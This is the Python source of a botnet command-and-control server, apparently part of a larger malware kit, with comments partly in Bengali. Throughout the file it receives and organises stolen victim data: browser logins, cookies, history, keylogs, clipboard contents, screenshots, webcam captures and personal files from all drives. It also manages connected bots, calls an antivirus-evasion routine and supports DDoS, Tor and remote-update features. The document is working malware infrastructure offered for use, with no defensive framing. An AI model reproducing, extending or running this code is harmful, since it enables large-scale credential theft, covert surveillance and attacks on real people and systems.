# -*- coding: utf-8 -*-

"""
c2_server.py – Ultra‑Pro Botnet C2 Server (Dynamic Size Version)
=============================================================
* Dynamic Size Header (4 bytes) for any data size
* Works with any payload size automatically
* No fixed size limits
* Colorful Terminal Interface with Colorama support
* Timestamp and Serial Number for Steal Data Files
* SHOW_STEAL and LATEST_STEAL commands
* AUTO-EXTRACT: Automatically extracts steal data to organized folders
* DYNAMIC BROWSER SUPPORT: All browsers detected automatically
* DYNAMIC FILES SUPPORT: Images, Videos, Documents, Audio from all drives
* BOT NUMBER: Sends unique Bot Number to each connected bot
* DYNAMIC LIST: Shows all connected bots with OS Name, Version, Tor Status
* BOT DETAILS: View specific bot information (bot <number>) with FULL Security Key
* SERVER STATS: View server statistics
* FEATURE TOGGLE: Enable/Disable Steal, DDoS, Tor (Broadcasts to all bots)
* UPDATE COMMAND: Update bot client remotely using modules/auto_update.py
* UPDATE CONFIRMATION: Shows update installation status from bots
* DIR/LS COMMAND: Show files in C2 directory
* DOWNLOAD CONFIRMATION: Shows download success/failure from bots
* EXEC OUTPUT: Shows command execution output from bots
"""

import os
import sys
import time
import json
import socket
import threading
import signal
import logging
import base64
import zlib
import struct
import traceback
import shutil
from datetime import datetime
from typing import Optional, Dict, Tuple

# --------------------------------------------------------------------------- #
# 🎨 Colorama for Windows Support
# --------------------------------------------------------------------------- #
try:
    from colorama import init, Fore, Back, Style, just_fix_windows_console
    init(autoreset=True)
    just_fix_windows_console()
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    # Fallback ANSI codes
    class Fore:
        BLACK = '\033[30m'
        RED = '\033[31m'
        GREEN = '\033[32m'
        YELLOW = '\033[33m'
        BLUE = '\033[34m'
        MAGENTA = '\033[35m'
        CYAN = '\033[36m'
        WHITE = '\033[37m'
        RESET = '\033[39m'
        LIGHTBLACK_EX = '\033[90m'
        LIGHTRED_EX = '\033[91m'
        LIGHTGREEN_EX = '\033[92m'
        LIGHTYELLOW_EX = '\033[93m'
        LIGHTBLUE_EX = '\033[94m'
        LIGHTMAGENTA_EX = '\033[95m'
        LIGHTCYAN_EX = '\033[96m'
        LIGHTWHITE_EX = '\033[97m'
    
    class Style:
        BRIGHT = '\033[1m'
        DIM = '\033[2m'
        NORMAL = '\033[22m'
        RESET_ALL = '\033[0m'

# --------------------------------------------------------------------------- #
# 🎨 Color Functions with Windows Support
# --------------------------------------------------------------------------- #
class Colors:
    """Terminal colors with Windows support"""
    HEADER = Fore.MAGENTA if COLORAMA_AVAILABLE else '\033[95m'
    BLUE = Fore.BLUE if COLORAMA_AVAILABLE else '\033[94m'
    CYAN = Fore.CYAN if COLORAMA_AVAILABLE else '\033[96m'
    GREEN = Fore.GREEN if COLORAMA_AVAILABLE else '\033[92m'
    YELLOW = Fore.YELLOW if COLORAMA_AVAILABLE else '\033[93m'
    RED = Fore.RED if COLORAMA_AVAILABLE else '\033[91m'
    BOLD = Style.BRIGHT if COLORAMA_AVAILABLE else '\033[1m'
    UNDERLINE = '\033[4m'
    END = Style.RESET_ALL if COLORAMA_AVAILABLE else '\033[0m'
    WHITE = Fore.WHITE if COLORAMA_AVAILABLE else '\033[97m'
    MAGENTA = Fore.MAGENTA if COLORAMA_AVAILABLE else '\033[35m'
    GRAY = Fore.LIGHTBLACK_EX if COLORAMA_AVAILABLE else '\033[90m'
    LIGHT_GREEN = Fore.LIGHTGREEN_EX if COLORAMA_AVAILABLE else '\033[92m'
    LIGHT_CYAN = Fore.LIGHTCYAN_EX if COLORAMA_AVAILABLE else '\033[96m'
    LIGHT_YELLOW = Fore.LIGHTYELLOW_EX if COLORAMA_AVAILABLE else '\033[93m'

def print_colored(text: str, color: str = Colors.WHITE, bold: bool = False):
    """Print colored text to terminal"""
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.END}")
    else:
        print(f"{color}{text}{Colors.END}")

def print_header(text: str):
    """Print header with decoration"""
    print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.GREEN}{text.center(60)}{Colors.END}")
    print(f"{Colors.CYAN}{'='*60}{Colors.END}\n")

def print_success(text: str):
    """Print success message"""
    print(f"{Colors.LIGHT_GREEN}✅ {text}{Colors.END}")

def print_error(text: str):
    """Print error message"""
    print(f"{Colors.RED}❌ {text}{Colors.END}")

def print_warning(text: str):
    """Print warning message"""
    print(f"{Colors.LIGHT_YELLOW}⚠️ {text}{Colors.END}")

def print_info(text: str):
    """Print info message"""
    print(f"{Colors.LIGHT_CYAN}ℹ️ {text}{Colors.END}")

def print_c2_status(text: str):
    """Print C2 status"""
    print(f"{Colors.MAGENTA}🖥️ {text}{Colors.END}")

def print_bot_event(text: str):
    """Print bot event"""
    print(f"{Colors.CYAN}🤖 {text}{Colors.END}")

def print_command(text: str):
    """Print command"""
    print(f"{Colors.LIGHT_YELLOW}💻 {text}{Colors.END}")

def print_data(text: str):
    """Print data transfer info"""
    print(f"{Colors.GRAY}📦 {text}{Colors.END}")

# --------------------------------------------------------------------------- #
# Configuration
# --------------------------------------------------------------------------- #
try:
    from config import C2_IP, C2_PORT
except ImportError:
    C2_IP = "127.0.0.1"
    C2_PORT = 4444

# --------------------------------------------------------------------------- #
# Debug Mode - OFF
# --------------------------------------------------------------------------- #
DEBUG = False

def debug_log(msg: str, level: str = "INFO"):
    """Debug log function - now disabled"""
    pass

# --------------------------------------------------------------------------- #
# Local Modules (Fallbacks)
# --------------------------------------------------------------------------- #
try:
    from modules.encryption import encrypt_data, decrypt_data
except ImportError:
    def encrypt_data(data, key=None):
        if isinstance(data, str): 
            data = data.encode()
        encrypted = bytearray()
        for i, b in enumerate(data):
            encrypted.append(b ^ key[i % len(key)])
        result = base64.b64encode(bytes(encrypted)).decode('utf-8')
        if len(result) % 4 != 0:
            result += '=' * (4 - len(result) % 4)
        return result

    def decrypt_data(data, key=None):
        try:
            if len(data) % 4 != 0:
                data += '=' * (4 - len(data) % 4)
            decoded = base64.b64decode(data)
            decrypted = bytearray()
            for i, b in enumerate(decoded):
                decrypted.append(b ^ key[i % len(key)])
            return bytes(decrypted).decode('utf-8')
        except Exception as e:
            raise ValueError(f"Decryption failed: {e}")

try:
    from modules.anti_av import bypass_antivirus
except ImportError:
    def bypass_antivirus(): pass

try:
    from modules.tor_relay import TorRelayManager, get_tor_relay_info
except ImportError:
    class TorRelayManager:
        def start(self): pass
        def stop(self): pass
    def get_tor_relay_info(): return {"status": "disabled"}

try:
    from modules.data_steal import send_data_to_c2
except ImportError:
    def send_data_to_c2(data): pass

try:
    from modules.ddos import start_ddos
except ImportError:
    def start_ddos(target_ip, target_port, duration, attack_type): pass

# --------------------------------------------------------------------------- #
# Logging - Clean and Minimal
# --------------------------------------------------------------------------- #
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s - %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger("C2Server")

# --------------------------------------------------------------------------- #
# Helper Functions
# --------------------------------------------------------------------------- #
def _sigterm_handler(signum, frame):
    print_warning("Signal received - shutting down.")
    if C2Server.instance:
        C2Server.instance.shutdown_flag = True

# ======================================================================== #
# 📁 Data Extractor Class - Auto Extract Steal Data (FULLY DYNAMIC)
# ======================================================================== #
class DataExtractor:
    """স্টিল ডেটা এক্সট্র্যাক্ট করে ফোল্ডারে সাজানোর ক্লাস"""
    
    @staticmethod
    def create_folder_structure(base_path: str):
        """ফোল্ডার স্ট্রাকচার তৈরি করুন - ডায়নামিক ব্রাউজার এবং ফাইলের জন্য"""
        folders = [
            "browsers",  # সব ব্রাউজার এখানে থাকবে
            "keylogs",
            "clipboard",
            "screenshots",
            "webcam",
            "dynamic_files/images",
            "dynamic_files/videos",
            "dynamic_files/documents",
            "dynamic_files/audio",
            "system_info"
        ]
        
        for folder in folders:
            path = os.path.join(base_path, folder)
            os.makedirs(path, exist_ok=True)
        
        return base_path
    
    @staticmethod
    def save_browser_data(data: dict, base_path: str):
        """ব্রাউজার ডেটা আলাদা ফোল্ডারে সেভ করুন - ডায়নামিক"""
        if 'browsers' not in data:
            return 0
        
        browsers = data['browsers']
        saved_count = 0
        
        for browser_name, browser_data in browsers.items():
            if not browser_data:
                continue
            
            clean_name = browser_name.lower().replace(' ', '_')
            save_path = os.path.join(base_path, 'browsers', clean_name)
            os.makedirs(save_path, exist_ok=True)
            
            if 'logins' in browser_data and browser_data['logins']:
                with open(os.path.join(save_path, 'logins.json'), 'w', encoding='utf-8') as f:
                    json.dump(browser_data['logins'], f, indent=2, ensure_ascii=False)
                saved_count += 1
            
            if 'cookies' in browser_data and browser_data['cookies']:
                with open(os.path.join(save_path, 'cookies.json'), 'w', encoding='utf-8') as f:
                    json.dump(browser_data['cookies'], f, indent=2, ensure_ascii=False)
                saved_count += 1
            
            if 'history' in browser_data and browser_data['history']:
                with open(os.path.join(save_path, 'history.json'), 'w', encoding='utf-8') as f:
                    json.dump(browser_data['history'], f, indent=2, ensure_ascii=False)
                saved_count += 1
        
        return saved_count
    
    @staticmethod
    def save_keylogs(data: dict, base_path: str):
        if 'keylogs' in data and data['keylogs']:
            save_path = os.path.join(base_path, 'keylogs', 'keylogs.txt')
            with open(save_path, 'w', encoding='utf-8') as f:
                f.write(data['keylogs'])
            return True
        return False
    
    @staticmethod
    def save_clipboard(data: dict, base_path: str):
        if 'clipboard' in data and data['clipboard']:
            save_path = os.path.join(base_path, 'clipboard', 'clipboard.txt')
            with open(save_path, 'w', encoding='utf-8') as f:
                f.write(data['clipboard'])
            return True
        return False
    
    @staticmethod
    def save_screenshot(data: dict, base_path: str):
        if 'screenshot' in data and data['screenshot']:
            try:
                screenshot_data = base64.b64decode(data['screenshot'])
                save_path = os.path.join(base_path, 'screenshots', 'screenshot.png')
                with open(save_path, 'wb') as f:
                    f.write(screenshot_data)
                return True
            except Exception as e:
                print_warning(f"Screenshot save failed: {e}")
        return False
    
    @staticmethod
    def save_webcam(data: dict, base_path: str):
        if 'webcam' in data and data['webcam']:
            try:
                webcam_data = base64.b64decode(data['webcam'])
                save_path = os.path.join(base_path, 'webcam', 'webcam.jpg')
                with open(save_path, 'wb') as f:
                    f.write(webcam_data)
                return True
            except Exception as e:
                print_warning(f"Webcam save failed: {e}")
        return False
    
    @staticmethod
    def save_dynamic_files(data: dict, base_path: str):
        """ডায়নামিক ফাইল সেভ করুন - Images, Videos, Documents, Audio"""
        if 'dynamic_files' not in data:
            return 0
        
        files_data = data['dynamic_files']
        saved_count = 0
        
        # Images
        if 'images' in files_data:
            for drive, folders in files_data['images'].items():
                for folder_name, files in folders.items():
                    save_path = os.path.join(base_path, 'dynamic_files', 'images', drive.replace(':', ''), folder_name)
                    os.makedirs(save_path, exist_ok=True)
                    for file_info in files:
                        try:
                            file_data = base64.b64decode(file_info['data'])
                            file_path = os.path.join(save_path, file_info['name'])
                            with open(file_path, 'wb') as f:
                                f.write(file_data)
                            saved_count += 1
                        except Exception as e:
                            pass
        
        # Videos
        if 'videos' in files_data:
            for drive, folders in files_data['videos'].items():
                for folder_name, files in folders.items():
                    save_path = os.path.join(base_path, 'dynamic_files', 'videos', drive.replace(':', ''), folder_name)
                    os.makedirs(save_path, exist_ok=True)
                    for file_info in files:
                        try:
                            file_data = base64.b64decode(file_info['data'])
                            file_path = os.path.join(save_path, file_info['name'])
                            with open(file_path, 'wb') as f:
                                f.write(file_data)
                            saved_count += 1
                        except Exception as e:
                            pass
        
        # Documents
        if 'documents' in files_data:
            for drive, folders in files_data['documents'].items():
                for folder_name, files in folders.items():
                    save_path = os.path.join(base_path, 'dynamic_files', 'documents', drive.replace(':', ''), folder_name)
                    os.makedirs(save_path, exist_ok=True)
                    for file_info in files:
                        try:
                            file_data = base64.b64decode(file_info['data'])
                            file_path = os.path.join(save_path, file_info['name'])
                            with open(file_path, 'wb') as f:
                                f.write(file_data)
                            saved_count += 1
                        except Exception as e:
                            pass
        
        # Audio
        if 'audio' in files_data:
            for drive, folders in files_data['audio'].items():
                for folder_name, files in folders.items():
                    save_path = os.path.join(base_path, 'dynamic_files', 'audio', drive.replace(':', ''), folder_name)
                    os.makedirs(save_path, exist_ok=True)
                    for file_info in files:
                        try:
                            file_data = base64.b64decode(file_info['data'])
                            file_path = os.path.join(save_path, file_info['name'])
                            with open(file_path, 'wb') as f:
                                f.write(file_data)
                            saved_count += 1
                        except Exception as e:
                            pass
        
        return saved_count
    
    @staticmethod
    def save_system_info(data: dict, base_path: str):
        if 'system_info' in data:
            save_path = os.path.join(base_path, 'system_info', 'system_info.json')
            with open(save_path, 'w', encoding='utf-8') as f:
                json.dump(data['system_info'], f, indent=2, ensure_ascii=False)
            return True
        return False
    
    @classmethod
    def extract(cls, json_file: str, output_dir: str = None) -> str:
        """JSON ফাইল থেকে ডেটা এক্সট্র্যাক্ট করুন"""
        if output_dir is None:
            base_name = os.path.splitext(os.path.basename(json_file))[0]
            output_dir = f"extracted_{base_name}"
        
        try:
            with open(json_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
        except Exception as e:
            print_error(f"Failed to read JSON: {e}")
            return None
        
        cls.create_folder_structure(output_dir)
        
        stats = {
            'browser_files': cls.save_browser_data(data, output_dir),
            'keylogs': cls.save_keylogs(data, output_dir),
            'clipboard': cls.save_clipboard(data, output_dir),
            'screenshot': cls.save_screenshot(data, output_dir),
            'webcam': cls.save_webcam(data, output_dir),
            'dynamic_files': cls.save_dynamic_files(data, output_dir),
            'system_info': cls.save_system_info(data, output_dir)
        }
        
        # ব্রাউজারের তালিকা
        browsers_found = data.get('browsers_found', [])
        if browsers_found:
            stats['browsers_found'] = browsers_found
            stats['total_browsers'] = len(browsers_found)
        
        # ডায়নামিক ফাইলের সারাংশ
        total_files = data.get('total_dynamic_files', 0)
        if total_files:
            stats['total_dynamic_files'] = total_files
            stats['images_count'] = data.get('dynamic_files', {}).get('images_count', 0)
            stats['videos_count'] = data.get('dynamic_files', {}).get('videos_count', 0)
            stats['documents_count'] = data.get('dynamic_files', {}).get('documents_count', 0)
            stats['audio_count'] = data.get('dynamic_files', {}).get('audio_count', 0)
        
        summary = {
            'extracted_at': datetime.now().isoformat(),
            'source_file': json_file,
            'output_directory': output_dir,
            'stats': stats
        }
        
        with open(os.path.join(output_dir, 'extraction_summary.json'), 'w', encoding='utf-8') as f:
            json.dump(summary, f, indent=2, ensure_ascii=False)
        
        return output_dir

# ======================================================================== #
# Main C2 Server Class
# ======================================================================== #

class C2Server:
    instance = None

    def __init__(self):
        self.server_socket: socket.socket = None
        self.clients: Dict[Tuple[str, int], Dict] = {}
        self.clients_lock = threading.Lock()
        self.shutdown_flag = False
        self.tor_manager = TorRelayManager() if 'TorRelayManager' in globals() else None
        self.tor_running = False
        self.bot_counter = 0
        self.steal_counter = 0
        self.steal_dir = "steal_data"
        self.extracted_dir = "extracted_data"
        self._start_time = time.time()
        
        # ✅ সরাসরি modules/auto_update.py ব্যবহার করুন
        self.update_file = "modules/auto_update.py"
        
        # ✅ Feature Toggle Flags
        self.steal_enabled = True
        self.ddos_enabled = True
        self.tor_enabled = True
        
        C2Server.instance = self
        
        os.makedirs(self.steal_dir, exist_ok=True)
        os.makedirs(self.extracted_dir, exist_ok=True)

    def start(self):
        print_header("🖥️  ULTRA-PRO C2 SERVER")
        print_info(f"Server IP: {Colors.YELLOW}{C2_IP}{Colors.END}")
        print_info(f"Server Port: {Colors.YELLOW}{C2_PORT}{Colors.END}")
        print_info(f"Steal Data Folder: {Colors.YELLOW}{self.steal_dir}{Colors.END}")
        print_info(f"Extracted Data Folder: {Colors.YELLOW}{self.extracted_dir}{Colors.END}")
        
        # ✅ Show update file status
        if os.path.exists(self.update_file):
            print_success(f"Update File: {self.update_file} (Available)")
        else:
            print_warning(f"Update File: {self.update_file} (Not Found)")
        print("")
        
        try:
            bypass_antivirus()
            print_success("Anti‑AV / sandbox evasion executed")
        except Exception as e:
            print_warning(f"Anti‑AV bypass failed: {e}")

        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((C2_IP, C2_PORT))
            self.server_socket.listen(128)
            print_success(f"Listening on {C2_IP}:{C2_PORT}")
            log.info(f"Listening on {C2_IP}:{C2_PORT}")
        except Exception as e:
            print_error(f"Failed to bind: {e}")
            log.error(f"Failed to bind: {e}")
            return

        threading.Thread(target=self._keepalive_loop, daemon=True).start()
        threading.Thread(target=self._accept_loop, daemon=True).start()
        threading.Thread(target=self._admin_console, daemon=True).start()
        
        signal.signal(signal.SIGINT, _sigterm_handler)
        signal.signal(signal.SIGTERM, _sigterm_handler)

        print_c2_status("C2 Server is running and waiting for connections...")
        print("")

        try:
            while not self.shutdown_flag:
                time.sleep(1)
        except KeyboardInterrupt:
            print_warning("Keyboard interrupt received.")
        finally:
            self.shutdown()

    def _keepalive_loop(self):
        while not self.shutdown_flag:
            time.sleep(15)
            with self.clients_lock:
                for addr, client_data in list(self.clients.items()):
                    try:
                        key = client_data['key']
                        conn = client_data['socket']
                        self._send_data(conn, "PING", key)
                    except Exception as e:
                        print_warning(f"Keepalive failed for {addr}: {e}")
                        self._disconnect_bot(addr)

    def _accept_loop(self):
        while not self.shutdown_flag:
            try:
                conn, addr = self.server_socket.accept()
                conn.settimeout(30)
                threading.Thread(target=self._handle_connection, args=(conn, addr), daemon=True).start()
            except socket.timeout:
                continue
            except OSError:
                break
            except Exception as exc:
                log.exception(f"Accept error: {exc}")

    def _recv_exact(self, conn: socket.socket, size: int) -> Optional[bytes]:
        if size <= 0:
            return b''
        data = b''
        while len(data) < size:
            try:
                chunk_size = min(8192, size - len(data))
                chunk = conn.recv(chunk_size)
                if not chunk:
                    return None
                data += chunk
            except socket.timeout:
                continue
            except Exception:
                return None
        return data

    def _recv_data(self, conn: socket.socket, key: bytes) -> Optional[str]:
        try:
            size_header = self._recv_exact(conn, 4)
            if not size_header:
                return None
            data_size = struct.unpack('>I', size_header)[0]
            if data_size > 50 * 1024 * 1024:
                print_warning(f"Data size {data_size} exceeds 50MB limit")
                return None
            if data_size == 0:
                return ""
            data = self._recv_exact(conn, data_size)
            if not data:
                return None
            try:
                text_data = data.decode('utf-8', errors='ignore').strip()
                if not text_data:
                    return None
                if len(text_data) % 4 != 0:
                    padding = 4 - (len(text_data) % 4)
                    if padding <= 2:
                        text_data += '=' * padding
                decrypted = decrypt_data(text_data, key)
                return decrypted
            except Exception:
                return None
        except socket.timeout:
            return None
        except Exception:
            return None

    def _send_data(self, conn: socket.socket, data: str, key: bytes) -> bool:
        try:
            encrypted = encrypt_data(data, key)
            if isinstance(encrypted, str):
                encrypted = encrypted.encode('utf-8')
            data_size = len(encrypted)
            size_header = struct.pack('>I', data_size)
            conn.sendall(size_header + encrypted)
            return True
        except Exception:
            return False

    def _handle_connection(self, conn: socket.socket, addr: Tuple[str, int]):
        try:
            conn.settimeout(30)
            size_header = self._recv_exact(conn, 4)
            if not size_header:
                print_warning(f"No size header from {addr}")
                conn.close()
                return
            key_size = struct.unpack('>I', size_header)[0]
            if key_size < 10 or key_size > 1024:
                print_warning(f"Invalid key size from {addr}: {key_size}")
                conn.close()
                return
            key_data = self._recv_exact(conn, key_size)
            if not key_data:
                print_warning(f"No key data from {addr}")
                conn.close()
                return
            try:
                key_str = key_data.decode('utf-8', errors='ignore').strip()
                if len(key_str) % 4 != 0:
                    padding = 4 - (len(key_str) % 4)
                    if padding <= 2:
                        key_str += '=' * padding
                decoded_key = base64.b64decode(key_str)
                session_key = decoded_key[:32]
            except Exception as e:
                print_warning(f"Key decode failed from {addr}: {e}")
                conn.close()
                return
            if len(session_key) != 32:
                print_warning(f"Invalid session key from {addr}: {len(session_key)} bytes")
                conn.close()
                return
            
            self.bot_counter += 1
            bot_number = self.bot_counter
            
            print_success(f"New bot connected: {addr} (Bot #{bot_number})")
            log.info(f"New bot connected: {addr} (Bot #{bot_number})")
            
            with self.clients_lock:
                self.clients[addr] = {
                    'socket': conn,
                    'key': session_key,
                    'connected_at': datetime.now(),
                    'bot_id': bot_number,
                    'os_name': 'Unknown',
                    'os_version': 'Unknown',
                    'tor_status': 'Not Started'
                }
            
            try:
                welcome_msg = f"BOT_NUMBER:{bot_number}"
                self._send_data(conn, welcome_msg, session_key)
                print_success(f"📤 Sent Bot Number #{bot_number} to {addr}")
                log.info(f"Sent Bot Number #{bot_number} to {addr}")
            except Exception as e:
                print_warning(f"Failed to send bot number: {e}")
            
            self._client_handler(conn, addr, session_key)
            
        except socket.timeout:
            print_warning(f"Key exchange timeout from {addr}")
            conn.close()
        except Exception as e:
            print_error(f"Key exchange error for {addr}: {e}")
            conn.close()

    def _client_handler(self, conn: socket.socket, addr: Tuple[str, int], key: bytes):
        while not self.shutdown_flag:
            try:
                decrypted = self._recv_data(conn, key)
                if decrypted is None:
                    if not self._check_connection(conn):
                        break
                    continue
                if decrypted:
                    response = self._process_bot_command(decrypted, addr)
                    if response:
                        self._send_data(conn, response, key)
            except (ConnectionResetError, BrokenPipeError):
                break
            except Exception as exc:
                log.exception(f"Client handler error ({addr}): {exc}")
                break
        self._disconnect_bot(addr)

    def _check_connection(self, conn: socket.socket) -> bool:
        try:
            conn.settimeout(5)
            return True
        except:
            return False

    def _disconnect_bot(self, addr: Tuple[str, int]):
        with self.clients_lock:
            client_data = self.clients.pop(addr, None)
        if client_data:
            conn = client_data['socket']
            try:
                conn.shutdown(socket.SHUT_RDWR)
                conn.close()
            except Exception:
                pass
            print_warning(f"Bot disconnected: {addr} (Bot #{client_data.get('bot_id', 'unknown')})")
            log.info(f"Bot disconnected: {addr} (Bot #{client_data.get('bot_id', 'unknown')})")

    # ======================================================================== #
    # 📁 Save and Auto-Extract Steal Data
    # ======================================================================== #
    
    def _save_and_extract_steal_data(self, data: dict, addr: Tuple[str, int]) -> tuple:
        self.steal_counter += 1
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        json_filename = f"steal_{self.steal_counter:03d}_{addr[0]}_{timestamp}.json"
        json_path = os.path.join(self.steal_dir, json_filename)
        
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        size = os.path.getsize(json_path)
        print_data(f"JSON saved: {json_filename} ({size:,} bytes)")
        
        print_info("🔄 Auto-extracting data...")
        extracted_folder = f"{self.extracted_dir}/extracted_{self.steal_counter:03d}_{addr[0]}_{timestamp}"
        
        try:
            extractor = DataExtractor()
            output_dir = extractor.extract(json_path, extracted_folder)
            
            if output_dir:
                print_success(f"✅ Data extracted to: {output_dir}")
                log.info(f"Extracted steal data to: {output_dir}")
                return json_path, output_dir
            else:
                print_warning("Extraction failed, but JSON saved")
                return json_path, None
                
        except Exception as e:
            print_error(f"Extraction error: {e}")
            return json_path, None

    def _list_steal_files(self) -> str:
        if not os.path.exists(self.steal_dir):
            return "📁 No steal data found."
        
        files = sorted(os.listdir(self.steal_dir))
        if not files:
            return "📁 No steal data found."
        
        result = ["📁 Steal Data Files (JSON):"]
        result.append("=" * 70)
        result.append(f"{'#':<5} {'Filename':<45} {'Size':<12} {'Date':<20}")
        result.append("-" * 70)
        
        total_size = 0
        for i, file in enumerate(files, 1):
            filepath = os.path.join(self.steal_dir, file)
            size = os.path.getsize(filepath)
            total_size += size
            mtime = datetime.fromtimestamp(os.path.getmtime(filepath)).strftime("%Y-%m-%d %H:%M:%S")
            
            if size > 1024 * 1024:
                size_str = f"{size / (1024*1024):.2f} MB"
            elif size > 1024:
                size_str = f"{size / 1024:.2f} KB"
            else:
                size_str = f"{size} B"
            
            result.append(f"{i:>3}. {file:<45} {size_str:>10}  {mtime}")
        
        result.append("-" * 70)
        result.append(f"Total: {len(files)} files, {total_size:,} bytes")
        
        if os.path.exists(self.extracted_dir):
            extracted_folders = [f for f in os.listdir(self.extracted_dir) if os.path.isdir(os.path.join(self.extracted_dir, f))]
            if extracted_folders:
                result.append("")
                result.append("📁 Extracted Folders:")
                result.append("-" * 70)
                for folder in sorted(extracted_folders, reverse=True)[:5]:
                    folder_path = os.path.join(self.extracted_dir, folder)
                    if os.path.exists(folder_path):
                        file_count = sum([len(files) for r, d, files in os.walk(folder_path)])
                        result.append(f"   📂 {folder} ({file_count} files)")
                if len(extracted_folders) > 5:
                    result.append(f"   ... and {len(extracted_folders) - 5} more folders")
        
        return "\n".join(result)

    def _get_latest_steal_file(self) -> Optional[str]:
        if not os.path.exists(self.steal_dir):
            return None
        files = sorted(os.listdir(self.steal_dir))
        if not files:
            return None
        return files[-1]

    # ======================================================================== #
    # 📊 Dynamic Bot List Methods - UPDATED with FULL Key
    # ======================================================================== #
    
    def _get_dynamic_bot_list(self) -> str:
        with self.clients_lock:
            if not self.clients:
                return "⚠️ No bots connected."
            
            lines = []
            lines.append("╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
            lines.append("║                                                              📊 CONNECTED BOTS                                                             ║")
            lines.append("╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣")
            
            for idx, (addr, data) in enumerate(self.clients.items(), 1):
                bot_id = data.get('bot_id', 'unknown')
                connected_at = data.get('connected_at', datetime.now()).strftime("%H:%M:%S")
                os_name = data.get('os_name', 'Unknown')[:12]
                os_version = data.get('os_version', 'Unknown')[:15]
                tor_status = data.get('tor_status', 'Off')
                tor_icon = "🟢" if tor_status.lower() == "running" else "🔴" if tor_status.lower() == "stopped" else "⚪"
                
                # ✅ FULL Key দেখান (Hex format)
                key = data.get('key', b'')
                if key:
                    key_hex = key.hex()
                    key_display = key_hex[:32] + '...' if len(key_hex) > 35 else key_hex
                else:
                    key_display = 'N/A'
                
                lines.append(f"║ {idx:>2}. Bot #{bot_id:<3} | {addr[0]:<15}:{addr[1]:<5} | 🟢 Online | OS:{os_name:<10} | Ver:{os_version:<12} | Tor:{tor_icon} {tor_status:<10} | Key:{key_display:<20} | {connected_at} ║")
            
            lines.append("╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣")
            lines.append(f"║ Total Bots: {len(self.clients):<116} ║")
            lines.append("╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
            
            return "\n".join(lines)

    def _get_bot_details(self, bot_number: int) -> str:
        with self.clients_lock:
                for addr, data in self.clients.items():
                    if data.get('bot_id') == bot_number:
                        lines = []
                        lines.append("╔══════════════════════════════════════════════════════════════════════════════════╗")
                        lines.append(f"║                              🤖 BOT #{bot_number} DETAILS                          ║")
                        lines.append("╠══════════════════════════════════════════════════════════════════════════════════╣")
                        lines.append(f"║ 🆔 Bot ID      : {data.get('bot_id', 'N/A'):<56} ║")
                        lines.append(f"║ 📡 IP Address  : {addr[0]:<56} ║")
                        lines.append(f"║ 🔌 Port        : {addr[1]:<56} ║")
                        
                        # ✅ OS Name এবং Version
                        os_name = data.get('os_name', 'Unknown')
                        os_version = data.get('os_version', 'Unknown')
                        lines.append(f"║ 💻 OS Name     : {os_name:<56} ║")
                        lines.append(f"║ 📦 OS Version  : {os_version:<56} ║")
                        
                        # ✅ Security Key
                        key = data.get('key', b'')
                        if key:
                            key_hex = key.hex()
                            if len(key_hex) > 50:
                                lines.append(f"║ 🔑 Security Key : {key_hex[:50]:<56} ║")
                                lines.append(f"║    {key_hex[50:100]:<56} ║")
                                if len(key_hex) > 100:
                                    lines.append(f"║    {key_hex[100:]:<56} ║")
                            else:
                                lines.append(f"║ 🔑 Security Key : {key_hex:<56} ║")
                            lines.append(f"║ 📏 Key Length  : {len(key)} bytes ({len(key)*8} bits){' ' * (56 - len(str(len(key)*8)) - 10)} ║")
                        else:
                            lines.append(f"║ 🔑 Security Key : {'N/A':<56} ║")
                        
                        lines.append(f"║ 🕐 Connected   : {data.get('connected_at', datetime.now()).strftime('%Y-%m-%d %H:%M:%S'):<56} ║")
                        
                        try:
                            self._send_data(data['socket'], "PING", data['key'])
                            status = "🟢 Online"
                        except:
                            status = "🔴 Offline"
                        lines.append(f"║ 📊 Status      : {status:<56} ║")
                        
                        tor_status = data.get('tor_status', 'Not Started')
                        tor_icon = "🟢" if tor_status.lower() == "running" else "🔴" if tor_status.lower() == "stopped" else "⚪"
                        lines.append(f"║ 🔒 Tor         : {tor_icon} {tor_status:<53} ║")
                        
                        lines.append("╚══════════════════════════════════════════════════════════════════════════════════╝")
                        return "\n".join(lines)
                
                return f"❌ Bot #{bot_number} not found!"

    def _get_server_stats(self) -> str:
        with self.clients_lock:
            lines = []
            lines.append("╔══════════════════════════════════════════════════════════════╗")
            lines.append("║                    📊 SERVER STATS                        ║")
            lines.append("╠══════════════════════════════════════════════════════════════╣")
            lines.append(f"║ 🤖 Total Bots     : {len(self.clients):<44} ║")
            lines.append(f"║ 📦 Steal Counter  : {self.steal_counter:<44} ║")
            lines.append(f"║ 📁 Steal Files    : {len(os.listdir(self.steal_dir)) if os.path.exists(self.steal_dir) else 0:<44} ║")
            lines.append(f"║ 🕐 Server Uptime  : {self._get_uptime():<44} ║")
            lines.append(f"║ 🔒 Tor Status     : {'✅ Active' if self.tor_running else '❌ Inactive':<44} ║")
            lines.append(f"║ 📄 Update File    : {'✅ Available' if os.path.exists(self.update_file) else '❌ Not Found':<44} ║")
            
            # ✅ OS Statistics
            os_stats = {}
            for addr, data in self.clients.items():
                os_name = data.get('os_name', 'Unknown')
                os_stats[os_name] = os_stats.get(os_name, 0) + 1
            
            if os_stats:
                lines.append("╠══════════════════════════════════════════════════════════════╣")
                lines.append("║                    💻 OS STATISTICS                        ║")
                for os_name, count in os_stats.items():
                    lines.append(f"║ {os_name:<20} : {count:<38} ║")
            
            lines.append("╚══════════════════════════════════════════════════════════════╝")
            return "\n".join(lines)

